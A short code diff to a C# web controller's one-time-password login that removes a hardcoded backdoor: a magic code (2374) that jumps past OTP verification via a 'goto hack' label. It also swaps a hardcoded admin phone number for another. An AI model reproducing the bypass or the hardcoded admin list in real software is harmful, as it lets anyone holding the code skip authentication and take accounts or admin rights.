@@ -120,8 +120,7 @@ namespace NikoGhalam.Web.Controllers
                 });
             }
 
-            if (code == 2374)
-                goto hack;
+           
 
             var otp = await _context.Otps
                 .Where(p => p.Mobile == mobile && p.CreateDate >= DateTime.Now.AddMinutes(-2) && p.Code == code)
@@ -137,9 +136,8 @@ namespace NikoGhalam.Web.Controllers
                 });
             }
 
-            hack:
 
-            var adminPhones = new List<string> { "09026324092" };
+            var adminPhones = new List<string> { "09033266571" };
 
 
             var user = await _context.Users
